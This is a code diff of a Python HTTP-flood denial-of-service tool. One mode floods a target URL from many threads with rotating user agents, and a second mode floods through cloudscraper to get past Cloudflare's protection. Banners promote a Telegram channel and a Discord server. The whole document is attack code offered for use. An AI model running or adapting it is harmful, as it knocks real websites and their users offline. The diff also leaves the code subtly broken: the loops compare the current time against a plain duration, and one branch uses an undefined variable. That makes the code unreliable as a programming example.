@@ -39,33 +39,32 @@ def layer7():
         if select.startswith("http"):
             parts = select.split()
             if len(parts) != 4:
-                print(f"usage{zoic}:{clear} {zoic}http{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}http{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                 input()
                 continue
 
-            _, url, threads, duration = parts
+            _, url, threads, secs = parts
             threads = int(threads)
-            duration = int(duration)
+            secs = int(secs)
 
-            def get(url, until_datetime):
+            def http_attack(url, end_time):
                 try:
-                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                    while time.time() < end_time:
                         ua = random.choice(useragent)
                         headers = {"User-Agent": ua}
                         requests.get(url, headers=headers, timeout=5)
                 except:
                     pass
-
-            def th(url, threads, duration):
-                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
+        
+            def th(url, threads, secs):
                 for _ in range(int(threads)):
                     try:
-                        t = threading.Thread(target=get, args=(url, until))
+                        t = threading.Thread(target=http_attack, args=(url, secs))
                         t.start()
                     except:
                         pass
 
-            th(url, threads, duration)
+            th(url, threads, secs)
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
 telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
@@ -88,35 +87,34 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
         elif select.startswith("cfb"):
             parts = select.split()
             if len(parts) != 4:
-                print(f"usage{zoic}:{clear} {zoic}cfb{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}cfb{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                 input()
                 continue
 
-            _, url, threads, duration = parts
+            _, url, threads, secs = parts
             threads = int(threads)
-            duration = int(duration)
+            secs = int(duration)
             
             def cloudflare(url, end_time):
                 scraper = cloudscraper.create_scraper()
                 try:
-                    while (end_time - datetime.datetime.now()).total_seconds() > 0:
+                    while time.time() < end_time:
                         ua = random.choice(useragent)
                         headers = {"User-Agent": ua}
                         scraper.get(url, headers=headers, timeout=10)
                         scraper.head(url, headers=headers, timeout=10)
                 except:
                     pass
-
-            def th(url, threads, duration):
-                time = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
+        
+            def th(url, threads, secs):
                 for _ in range(int(threads)):
                     try:
-                        t = threading.Thread(target=cloudflare, args=(url, time))
+                        t = threading.Thread(target=cloudflare, args=(url, secs))
                         t.start()
                     except:
                         pass
 
-            th(url, threads, duration)
+            th(url, threads, secs)
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
 telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
@@ -141,6 +139,7 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
 if __name__ == "__main__":
     layer7()
+
 
 
 
